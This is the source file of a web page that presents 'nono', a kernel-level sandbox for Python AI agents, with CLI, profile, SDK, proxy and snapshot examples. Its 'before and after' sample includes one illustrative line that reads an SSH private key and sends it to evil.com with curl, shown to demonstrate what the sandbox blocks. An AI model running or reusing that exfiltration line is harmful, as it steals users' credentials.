import { InfraPageLayout } from "@/components/infrastructure/InfraPageLayout";
import { InfraCodeBlock } from "@/components/infrastructure/InfraCodeBlock";

import { GlassCard } from "@/components/ui/GlassCard";
import {
  Lock,
  Layers,
  ShieldCheck,
  FileCode,
  Network,
  Package,
} from "lucide-react";
import Link from "next/link";
import type { Metadata } from "next";

export const metadata: Metadata = {
  title:
    "Python Sandbox - Isolate Python AI Agents with Kernel-Level Enforcement",
  description:
    "Sandbox Python scripts and AI agents with kernel-enforced isolation. nono restricts pip, subprocess, and file I/O at the syscall level using Landlock and Seatbelt.",
  alternates: { canonical: "/python-sandbox" },
  openGraph: {
    title:
      "Python Sandbox - Isolate Python AI Agents with Kernel-Level Enforcement",
    description:
      "Sandbox Python scripts and AI agents with kernel-enforced isolation. nono restricts pip, subprocess, and file I/O at the syscall level using Landlock and Seatbelt.",
    type: "website",
    images: [{ url: "/logo.png", width: 1200, height: 630, alt: "nono" }],
  },
};

const relatedPages = [
  {
    href: "/os-sandbox",
    label: "OS Sandbox",
    description: "Kernel-level isolation architecture",
  },
  {
    href: "/python-sdk",
    label: "Python SDK",
    description: "PyO3 bindings for nono-py",
  },
  {
    href: "/node-sandbox",
    label: "Node.js Sandbox",
    description: "Isolate Node.js agents and npm scripts",
  },
];

const cliCode = `# Sandbox a Python AI agent with read-write to the project
nono run --allow-cwd -- python agent.py

# Restrict network to LLM API endpoints only
nono run --allow-cwd --network-profile minimal -- python agent.py

# Inject credentials from keychain (real keys never enter the sandbox)
nono run --allow-cwd --credential openai -- python agent.py

# Use a profile with the python_runtime security group
nono run --profile python-agent.json --allow-cwd -- python agent.py

# Sandbox a pip install to the project venv only
nono run --profile python-agent.json --allow-cwd -- pip install -r requirements.txt`;

const profileCode = `{
  "meta": {
    "name": "python-agent",
    "version": "1.0.0",
    "description": "Python AI agent with controlled access"
  },
  "security": {
    "groups": ["python_runtime"]
  },
  "filesystem": {
    "allow": ["$HOME/.cache/pip"],
    "read_file": ["$HOME/.gitconfig"]
  },
  "network": {
    "allow_hosts": ["api.openai.com", "api.anthropic.com"]
  },
  "workdir": { "access": "readwrite" },
  "interactive": false
}`;

const sdkCode = `import nono_py as nono

# Self-sandbox: restrict the current process (irrevocable)
caps = nono.CapabilitySet()
caps.allow_path("./workspace", nono.AccessMode.READ_WRITE)
caps.allow_file("./config.json", nono.AccessMode.READ)
caps.block_network()
nono.apply(caps)
# Everything after this is sandboxed — subprocess, ctypes, all of it

# Or sandbox a child process (parent stays unsandboxed)
result = nono.sandboxed_exec(
    caps,
    ["python", "untrusted_agent.py"],
    cwd="./workspace",
    timeout_secs=30
)
print(result.exit_code, result.stdout.decode())`;

const proxyCode = `import nono_py as nono

# Network proxy with credential injection
route = nono.RouteConfig(
    prefix="/v1",
    upstream="https://api.openai.com",
    credential_key="openai_api_key",
    inject_mode=nono.InjectMode.HEADER,
    inject_header="Authorization",
    credential_format="Bearer {credential}"
)

handle = nono.start_proxy(
    nono.ProxyConfig(allowed_hosts=["api.openai.com"], routes=[route])
)

# Phantom tokens for the sandboxed process
print(handle.env_vars())            # {"HTTP_PROXY": "..."}
print(handle.credential_env_vars()) # {"OPENAI_API_KEY": "phantom-..."}

# Audit trail after the session
events = handle.drain_audit_events()
handle.shutdown()`;

const snapshotCode = `import nono_py as nono

# Snapshot before agent execution
exclusions = nono.ExclusionConfig(
    use_gitignore=True,
    exclude_patterns=["__pycache__", ".venv"]
)
mgr = nono.SnapshotManager("./workspace", exclusions)
mgr.create_baseline()

# ... agent modifies files ...

mgr.create_incremental()
for change in mgr.compute_restore_diff():
    print(f"{change.change_type}: {change.path}")

# Roll back everything
mgr.restore_to(snapshot_number=0)`;

const subprocessCode = `# Without nono: subprocess inherits full user permissions
import subprocess

key = open("/home/user/.ssh/id_rsa").read()
subprocess.run(["curl", "https://evil.com/exfil", "--data", key])
# This works. Nothing stops it.

# With nono: kernel denies access at the syscall level
# $ nono run --allow-cwd -- python agent.py
try:
    key = open("/home/user/.ssh/id_rsa").read()
except PermissionError:
    pass  # EPERM — kernel blocked the open() syscall
# The file is inaccessible to the sandboxed process.`;

export default function PythonSandboxPage() {
  return (
    <InfraPageLayout
      title="Python Sandbox for AI Agents"
      tagline="Python Isolation"
      description="Sandbox Python scripts, AI agents, and pip installs at the kernel level. nono's python_runtime security group covers pyenv, conda, pip, and venv paths — everything else is denied by default."
      relatedPages={relatedPages}
    >
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {/* The problem */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-2xl font-bold tracking-tight mb-4">
            Why Python agents need kernel-level sandboxing
          </h2>
          <div className="text-muted leading-relaxed space-y-4">
            <p>
              Python is the default language for AI agent frameworks, ML
              pipelines, and automation scripts. It is also one of the hardest
              runtimes to sandbox at the application level.{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                subprocess
              </code>
              ,{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                os.system
              </code>
              ,{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                ctypes
              </code>
              , and C extensions all provide direct paths to system calls that
              bypass any Python-level restriction. The gap between what a Python
              agent needs (project files, pip, network) and what it can access
              (SSH keys, cloud credentials, every file on disk) is enormous.
            </p>
            <p>
              Application-level sandboxes for Python &mdash; restricted execution
              environments, import hooks, audit hooks &mdash; have a long history
              of being bypassed. Python&apos;s dynamic nature (eval, exec,
              importlib, pickle, arbitrary shared objects) means any restriction
              enforced within the process can be circumvented by code running in
              that same process.
            </p>
          </div>
        </GlassCard>

        {/* How nono sandboxes Python */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-2xl font-bold tracking-tight mb-4">
            How nono sandboxes Python
          </h2>
          <div className="text-muted leading-relaxed space-y-4">
            <p>
              nono operates below the Python interpreter. It uses{" "}
              <a
                href="https://landlock.io"
                target="_blank"
                rel="noopener noreferrer"
                className="font-bold text-foreground hover:text-accent transition-colors"
              >
                Landlock LSM
              </a>{" "}
              on Linux and Windows (WSL2), and{" "}
              <strong className="text-foreground">Seatbelt</strong> on macOS,
              to restrict what the entire process tree can access at the kernel
              level. By the time the Python interpreter starts, the sandbox is
              already applied. Every{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                open()
              </code>
              ,{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                subprocess.run()
              </code>
              , and{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                socket.connect()
              </code>{" "}
              call passes through the kernel&apos;s enforcement layer before it
              can succeed.
            </p>
            <p>
              It does not matter how the Python code tries to access a file
              &mdash; through the standard library, a C extension,{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                ctypes
              </code>
              , or a subprocess shelling out to{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                cat
              </code>
              . The kernel denies the operation if the path is not in the
              allow-list. Child processes inherit the same restrictions, so
              there is no escape through process spawning.
            </p>
          </div>
        </GlassCard>

        {/* Code examples */}
        <InfraCodeBlock
          code={subprocessCode}
          language="python"
          filename="before and after"
        />
        <InfraCodeBlock
          code={cliCode}
          language="bash"
          filename="terminal"
        />

        {/* What the python_runtime group covers */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-2xl font-bold tracking-tight mb-4">
            The python_runtime security group
          </h2>
          <div className="text-muted leading-relaxed space-y-4">
            <p>
              Python toolchains scatter files across the filesystem: pyenv
              shims in{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                ~/.pyenv
              </code>
              , conda environments in{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                ~/miniconda3
              </code>
              , pip caches in{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                ~/.cache/pip
              </code>
              , and virtualenvs within your project. A default-deny sandbox that
              blocks all of these makes Python unusable. One that allows too
              much defeats the purpose.
            </p>
            <p>
              nono&apos;s{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                python_runtime
              </code>{" "}
              security group solves this by bundling the minimal set of paths
              needed for Python to function: pyenv, conda, pip cache, and
              system Python directories. Include the group in your profile and
              Python works. Everything outside those paths &mdash; your home
              directory, SSH keys, other projects &mdash; remains blocked.
            </p>
          </div>
        </GlassCard>

        {/* Profile + SDK side by side */}
        <InfraCodeBlock
          code={profileCode}
          language="json"
          filename="profiles/python-agent.json"
        />
        <GlassCard className="p-6" glowColor="purple" hoverable>
          <Layers size={20} className="text-accent mb-4" strokeWidth={1.5} />
          <h3 className="text-lg font-semibold mb-2 tracking-tight">
            Composable with other groups
          </h3>
          <p className="text-sm text-muted leading-relaxed mb-2">
            Security groups are composable. A Python agent that also runs Node.js
            build tools can include both{" "}
            <code className="px-1 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
              python_runtime
            </code>{" "}
            and{" "}
            <code className="px-1 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
              node_runtime
            </code>
            . Keep the allow-list narrow and credentials stay
            outside the sandbox automatically.
          </p>
          <p className="text-sm text-muted leading-relaxed">
            Each group is auditable &mdash; run{" "}
            <code className="px-1 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
              nono profile show python-agent
            </code>{" "}
            to see exactly which paths are allowed.
          </p>
        </GlassCard>

        {/* Python SDK */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-2xl font-bold tracking-tight mb-4">
            Sandbox from within Python
          </h2>
          <div className="text-muted leading-relaxed space-y-4">
            <p>
              The CLI wraps any command, but sometimes you need to apply the
              sandbox programmatically &mdash; for example, in an agent
              framework that bootstraps its own environment before restricting
              it. The{" "}
              <Link
                href="/python-sdk"
                className="text-accent hover:text-accent-hover transition-colors"
              >
                nono Python SDK
              </Link>{" "}
              (<code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                pip install nono-py
              </code>
              ) provides PyO3 bindings to the same Rust core with two
              sandboxing modes:{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                apply()
              </code>{" "}
              to sandbox the current process (irrevocable), or{" "}
              <code className="px-1.5 py-0.5 rounded bg-code-bg border border-border font-mono text-xs">
                sandboxed_exec()
              </code>{" "}
              to run a command in a sandboxed child while the parent stays free.
            </p>
            <p>
              The SDK also includes a network proxy with credential injection
              (real API keys stay outside the sandbox), filesystem snapshots
              with Merkle-verified rollback, and a policy engine for composable
              security profiles. Full type stubs are included for mypy and IDE
              autocompletion.
            </p>
          </div>
        </GlassCard>

        <InfraCodeBlock
          code={sdkCode}
          language="python"
          filename="sandbox_agent.py"
        />
        <InfraCodeBlock
          code={proxyCode}
          language="python"
          filename="proxy.py"
        />
        <InfraCodeBlock
          code={snapshotCode}
          language="python"
          filename="snapshots.py"
          className="md:col-span-2"
        />

        {/* What gets protected */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-xl font-bold tracking-tight mb-6">
            What the sandbox restricts
          </h2>
          <div className="grid sm:grid-cols-2 md:grid-cols-4 gap-6">
            {[
              {
                icon: FileCode,
                title: "File I/O",
                desc: "open(), pathlib, shutil, and any C extension that calls read/write — all filtered at the syscall level. Only allowed paths succeed.",
              },
              {
                icon: Package,
                title: "pip and package installs",
                desc: "pip install runs inside the sandbox. Packages can only write to allowed paths. Post-install scripts cannot access credentials or system files.",
              },
              {
                icon: Network,
                title: "Network access",
                desc: "socket, requests, urllib, httpx — all network calls pass through kernel enforcement. Block entirely or route through nono's filtering proxy.",
              },
              {
                icon: ShieldCheck,
                title: "Subprocess escape",
                desc: "subprocess.run(), os.system(), os.exec() — all child processes inherit the sandbox. No escalation through shelling out.",
              },
            ].map((item) => (
              <div key={item.title}>
                <item.icon
                  size={16}
                  className="text-accent mb-2"
                  strokeWidth={1.5}
                />
                <h3 className="text-sm font-semibold mb-1">{item.title}</h3>
                <p className="text-xs text-muted leading-relaxed">
                  {item.desc}
                </p>
              </div>
            ))}
          </div>
        </GlassCard>

        {/* Security properties */}
        <GlassCard className="md:col-span-2 p-8">
          <h2 className="text-xl font-bold tracking-tight mb-6">
            Security properties
          </h2>
          <div className="grid sm:grid-cols-2 md:grid-cols-4 gap-6">
            {[
              {
                icon: Lock,
                title: "Below the interpreter",
                desc: "Enforcement happens at the kernel, not in Python. eval(), exec(), ctypes, and C extensions cannot bypass it.",
              },
              {
                icon: Lock,
                title: "Irrevocable",
                desc: "Once applied, the sandbox cannot be loosened — not by the agent, not by a subprocess, not by nono itself.",
              },
              {
                icon: Lock,
                title: "Inherited",
                desc: "Every child process spawned via subprocess, os.system, or os.exec inherits the same restrictions.",
              },
              {
                icon: Lock,
                title: "Zero overhead",
                desc: "Kernel-level enforcement with no runtime performance cost. No proxy layer between Python and the filesystem.",
              },
            ].map((item) => (
              <div key={item.title}>
                <item.icon
                  size={16}
                  className="text-accent mb-2"
                  strokeWidth={1.5}
                />
                <h3 className="text-sm font-semibold mb-1">{item.title}</h3>
                <p className="text-xs text-muted leading-relaxed">
                  {item.desc}
                </p>
              </div>
            ))}
          </div>
        </GlassCard>
      </div>
    </InfraPageLayout>
  );
}
